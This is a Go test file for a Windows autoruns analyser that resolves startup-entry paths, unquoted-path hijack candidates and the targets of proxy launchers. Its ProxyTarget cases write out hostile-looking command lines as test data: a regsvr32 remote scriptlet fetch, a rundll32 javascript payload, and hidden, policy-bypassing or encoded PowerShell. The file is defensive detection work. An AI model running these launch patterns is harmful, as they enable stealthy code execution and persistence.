package autoruns

import (
	"reflect"
	"strings"
	"testing"
)

// fakeEnv è un ambiente di Windows finto: variabili (senza maiuscole) e file
// esistenti.
type fakeEnv struct {
	vars  map[string]string
	files map[string]bool
}

func newFakeEnv(files ...string) *fakeEnv {
	f := &fakeEnv{vars: map[string]string{
		"systemroot":              `C:\Windows`,
		"systemdrive":             `C:`,
		"programfiles":            `C:\Program Files`,
		"programfiles(x86)":       `C:\Program Files (x86)`,
		"programw6432":            `C:\Program Files`,
		"commonprogramfiles":      `C:\Program Files\Common Files`,
		"commonprogramfiles(x86)": `C:\Program Files (x86)\Common Files`,
		"programdata":             `C:\ProgramData`,
		"userprofile":             `C:\Users\anna`,
		"appdata":                 `C:\Users\anna\AppData\Roaming`,
		"localappdata":            `C:\Users\anna\AppData\Local`,
		"path":                    `C:\Windows\system32;C:\Windows;C:\Tools\bin;relativo`,
	}, files: map[string]bool{}}
	for _, p := range files {
		f.files[strings.ToLower(p)] = true
	}
	return f
}

func (f *fakeEnv) resolver() Resolver {
	return Resolver{
		Getenv: func(k string) string { return f.vars[strings.ToLower(k)] },
		Exists: func(p string) bool { return f.files[strings.ToLower(p)] },
	}
}

func TestExpand(t *testing.T) {
	r := newFakeEnv().resolver()
	for _, c := range []struct {
		in    string
		wow32 bool
		want  string
	}{
		{`%ProgramFiles%\App\a.exe`, false, `C:\Program Files\App\a.exe`},
		{`%ProgramFiles%\App\a.exe`, true, `C:\Program Files (x86)\App\a.exe`},
		{`%CommonProgramFiles%\x.dll`, true, `C:\Program Files (x86)\Common Files\x.dll`},
		{`%SystemRoot%\system32\svchost.exe -k netsvcs`, false, `C:\Windows\system32\svchost.exe -k netsvcs`},
		{`%NONESISTE%\x.exe %USERPROFILE%`, false, `%NONESISTE%\x.exe C:\Users\anna`},
		{`100% sicuro`, false, `100% sicuro`},
		{`%a b%c%LOCALAPPDATA%`, false, `%a b%cC:\Users\anna\AppData\Local`},
	} {
		if got := r.Expand(c.in, c.wow32); got != c.want {
			t.Errorf("Expand(%q, %v) = %q, atteso %q", c.in, c.wow32, got, c.want)
		}
	}
}

func TestCandidatesAndLocate(t *testing.T) {
	env := newFakeEnv(`C:\Program Files (x86)\Vendor\up.exe`, `C:\Windows\SysWOW64\legacy.dll`, `C:\Tools\bin\tool.exe`, `C:\Program Files\Solo64\a.exe`)
	r := env.resolver()
	for _, c := range []struct {
		in    string
		wow32 bool
		want  string
	}{
		{`\SystemRoot\System32\drivers\x.sys`, false, `C:\Windows\System32\drivers\x.sys`},
		{`System32\drivers\y.sys`, false, `C:\Windows\System32\drivers\y.sys`},
		{`system32\DRIVERS\z.sys`, false, `C:\Windows\system32\DRIVERS\z.sys`},
		{`\??\C:\Vendor\drv.sys`, false, `C:\Vendor\drv.sys`},
		{`"C:\Program Files\App\a.exe"`, false, `C:\Program Files\App\a.exe`},
		// Voce a 32 bit: %ProgramFiles% punta alla cartella (x86).
		{`%ProgramFiles%\Vendor\up.exe`, true, `C:\Program Files (x86)\Vendor\up.exe`},
		// ...ma se il file sta nella cartella nativa si trova lo stesso.
		{`%ProgramFiles%\Solo64\a.exe`, true, `C:\Program Files\Solo64\a.exe`},
		// Un programma a 32 bit che chiede System32 legge SysWOW64.
		{`C:\Windows\System32\legacy.dll`, true, `C:\Windows\SysWOW64\legacy.dll`},
		// Solo il nome: cartelle di sistema, poi il PATH; .exe aggiunto.
		{`tool`, false, `C:\Tools\bin\tool.exe`},
		{`notepad.exe`, false, `C:\Windows\System32\notepad.exe`},
		{`\Vendor\x.exe`, false, `C:\Vendor\x.exe`},
		{``, false, ``},
	} {
		if got := r.Locate(c.in, c.wow32); got != c.want {
			t.Errorf("Locate(%q, %v) = %q, atteso %q", c.in, c.wow32, got, c.want)
		}
	}
	// Il PATH non porta cartelle relative.
	for _, c := range r.Candidates("x", false) {
		if strings.HasPrefix(strings.ToLower(c), "relativo") {
			t.Errorf("cartella relativa del PATH usata: %s", c)
		}
	}
	// Prefissi con lettere che cambiano lunghezza in minuscolo: nessun taglio sbagliato.
	if got := r.Locate("\u0130\\SystemRoot\\x.exe", false); !strings.HasPrefix(got, `C:\Windows\`) {
		t.Errorf("percorso relativo con İ: %q", got)
	}
}

func TestSplit(t *testing.T) {
	r := newFakeEnv(`C:\Program Files\Senza Est\prog`, `C:\Program Files\Vendor App\svc.exe`).resolver()
	for _, c := range []struct {
		in, file, args string
		quoted         bool
	}{
		{`"C:\Program Files\App\a.exe" --min`, `C:\Program Files\App\a.exe`, `--min`, true},
		{`"C:\Program Files\App\a.exe`, `C:\Program Files\App\a.exe`, ``, true},
		{`C:\Program Files\Vendor App\svc.exe -k x`, `C:\Program Files\Vendor App\svc.exe`, `-k x`, false},
		{`C:\Users\anna\AppData\Local\Discord\Update.exe --processStart Discord.exe`, `C:\Users\anna\AppData\Local\Discord\Update.exe`, `--processStart Discord.exe`, false},
		{`rundll32.exe shell32.dll,Control_RunDLL x`, `rundll32.exe`, `shell32.dll,Control_RunDLL x`, false},
		{`C:\My App.v2\x.exe /s`, `C:\My App.v2\x.exe`, `/s`, false},
		// Senza estensione: il primo prefisso che esiste, come CreateProcess.
		{`C:\Program Files\Senza Est\prog --x`, `C:\Program Files\Senza Est\prog`, `--x`, false},
		// Nulla esiste: il primo pezzo.
		{`ignoto argomento`, `ignoto`, `argomento`, false},
		{`  `, ``, ``, false},
	} {
		f, a, q := r.Split(c.in, false)
		if f != c.file || a != c.args || q != c.quoted {
			t.Errorf("Split(%q) = %q, %q, %v; atteso %q, %q, %v", c.in, f, a, q, c.file, c.args, c.quoted)
		}
	}
}

func TestInterceptorCandidates(t *testing.T) {
	got := InterceptorCandidates(`C:\Program Files\Vendor App\Sub Dir\svc.exe`)
	want := []string{`C:\Program.exe`, `C:\Program Files\Vendor.exe`, `C:\Program Files\Vendor App\Sub.exe`}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("candidati: %q", got)
	}
	// Un componente con estensione si prova com'è; doppi spazi una volta sola.
	got = InterceptorCandidates(`C:\My.App  x\a.exe`)
	if !reflect.DeepEqual(got, []string{`C:\My.App`}) {
		t.Errorf("con estensione: %q", got)
	}
	if InterceptorCandidates(`C:\Windows\system32\svchost.exe`) != nil {
		t.Error("percorso senza spazi")
	}
}

func TestProxyTarget(t *testing.T) {
	for _, c := range []struct {
		file, args, target string
		proxy              bool
	}{
		{`C:\Windows\System32\rundll32.exe`, `shell32.dll,Control_RunDLL desk.cpl`, `shell32.dll`, true},
		{`rundll32`, `"C:\Users\anna\AppData\Roaming\x y\evil.dll",Start`, `C:\Users\anna\AppData\Roaming\x y\evil.dll`, true},
		{`rundll32.exe`, `C:\ProgramData\a.dll Entry`, `C:\ProgramData\a.dll`, true},
		{`rundll32.exe`, `javascript:"\..\mshtml,RunHTMLApplication ";alert(1)`, ``, true},
		{`regsvr32.exe`, `/s /n /u /i:http://x/y.sct scrobj.dll`, `scrobj.dll`, true},
		{`mshta.exe`, `C:\ProgramData\run.hta`, `C:\ProgramData\run.hta`, true},
		{`mshta.exe`, `vbscript:Execute("x")`, ``, true},
		{`wscript.exe`, `//B //Nologo "C:\Users\anna\a b.vbs" /arg`, `C:\Users\anna\a b.vbs`, true},
		{`cscript`, `/nologo C:\x\y.js`, `C:\x\y.js`, true},
		{`powershell.exe`, `-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\anna\s.ps1" -x 1`, `C:\Users\anna\s.ps1`, true},
		{`powershell.exe`, `-nop -w hidden -f C:\a.ps1`, `C:\a.ps1`, true},
		{`powershell.exe`, `-ep bypass C:\b.ps1`, `C:\b.ps1`, true},
		{`powershell.exe`, `-NoProfile -Command "Get-Process"`, ``, true},
		{`powershell.exe`, `-enc ZQBjAGgAbwA=`, ``, true},
		{`pwsh.exe`, `Write-Host ciao`, ``, true},
		{`C:\Windows\System32\cmd.exe`, `/c "C:\Program Files\App\run.bat" x`, `C:\Program Files\App\run.bat`, true},
		{`cmd.exe`, `/q /c start "" /min "C:\Users\anna\x.exe"`, `C:\Users\anna\x.exe`, true},
		{`cmd`, `/c call C:\x\y.cmd`, `C:\x\y.cmd`, true},
		{`cmd.exe`, `/c echo ciao > nul`, ``, true},
		{`cmd.exe`, `/c start https://example.com`, ``, true},
		{`C:\Program Files\App\app.exe`, `/background`, ``, false},
		{`powershell.exe`, ``, ``, true},
	} {
		got, proxy := ProxyTarget(c.file, c.args)
		if got != c.target || proxy != c.proxy {
			t.Errorf("ProxyTarget(%q, %q) = %q, %v; atteso %q, %v", c.file, c.args, got, proxy, c.target, c.proxy)
		}
	}
}
